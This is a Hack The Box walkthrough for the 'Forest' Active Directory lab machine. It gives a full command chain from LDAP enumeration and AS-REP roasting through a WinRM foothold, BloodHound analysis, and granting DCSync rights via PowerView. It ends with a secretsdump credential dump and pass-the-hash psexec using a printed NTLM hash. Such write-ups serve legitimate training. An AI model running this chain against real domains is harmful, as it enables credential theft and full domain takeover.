---
title: "Hack The Box: Forest Walkthrough"
date: 2026-02-05 12:00:00 +0000
categories: [HackTheBox, Active Directory, Windows]
tags: [walkthrough, windows, active directory, easy, kerberos, asreproast, exchange, dcsync]
image:
  path: /assets/forest/cover.png
---

# Forest — Hack The Box Walkthrough

## Synopsis

**Machine Name:** Forest  
**Prepared By:** k1ph4ru  
**Machine Author(s):** egre55 & mrb3n  
**Difficulty:** Easy  
**Classification:** Official  

Forest is an easy Windows machine showcasing an Active Directory Domain Controller with Microsoft Exchange installed. Anonymous LDAP binds allow domain enumeration, leading to discovery of a Kerberos service account with pre-authentication disabled. AS-REP roasting is used to obtain credentials and gain initial access. Further enumeration using BloodHound reveals abuse paths via Exchange groups, ultimately allowing DCSync and full domain compromise.

---

## Skills Required

- Enumeration

## Skills Learned

- AS-REP Roasting  
- Active Directory Enumeration  
- BloodHound Analysis  
- DCSync Attack  

---

## 0x0 – Nmap Enumeration

```shell
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.161
```

Key observations:

Windows Server 2016 Domain Controller

Domain: htb.local

Kerberos, LDAP, SMB, WinRM, and Exchange-related services exposed

Add the domain to /etc/hosts:
```shell
echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
```

## 0x1 – Anonymous LDAP Enumeration
```shell
ldapsearch -x -H ldap://10.10.10.161:389 -b "dc=htb,dc=local"
```

LDAP queries succeed without authentication, confirming null bind is enabled.

## 0x2 – User Enumeration with Windapsearch
```shell
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
```

Findings indicate:

Multiple mailbox-related accounts

Exchange Server is present

Several valid domain users discovered

## 0x3 – Domain Object Enumeration
```shell
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"
```

A service account is identified:

svc-alfresco
This account is known to commonly have Kerberos pre-authentication disabled.

## 0x4 – AS-REP Roasting
```shell
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```

The AS-REP hash is cracked using John:
```shell
john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
```
Recovered credentials:
```shell
svc-alfresco : s3rvice
```

## 0x5 – Initial Foothold via WinRM

```shell
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
whoami
htb\svc-alfresco
```

User flag location:
```shell
C:\Users\svc-alfresco\Desktop\user.txt
```

## 0x6 – BloodHound Data Collection
```shell
upload SharpHound.exe
.\SharpHound.exe -c All
```

Download the resulting ZIP and import it into BloodHound.

## 0x7 – Privilege Escalation Analysis

![Desktop View](/assets/forest/image1.png){: width="700" height="400" .normal }

BloodHound reveals:
svc-alfresco ∈ Account Operators

Exchange Windows Permissions has WriteDACL on the domain

This enables assignment of DCSync privileges.
![Desktop View](/assets/forest/image2.png){: width="700" height="400" .normal }
## 0x8 – Creating a New Privileged User
```shell
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
```

## 0x9 – Granting DCSync Rights
```shell
upload PowerView.ps1
. .\PowerView.ps1
$pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

## 0xA – Dumping Domain Credentials
```shell
impacket-secretsdump htb/john@10.10.10.161
```

The Administrator NTLM hash is successfully obtained.

## 0xB – Domain Admin Access
```shell
impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
Root flag location:
C:\Users\Administrator\Desktop\root.txt

Conclusion
Forest demonstrates how common Active Directory misconfigurations—anonymous LDAP binds, disabled Kerberos pre-authentication, and Exchange group privilege abuse—can be chained together to achieve full domain compromise without exploiting a single vulnerability.


🔥 Happy Hacking XD! 🔥

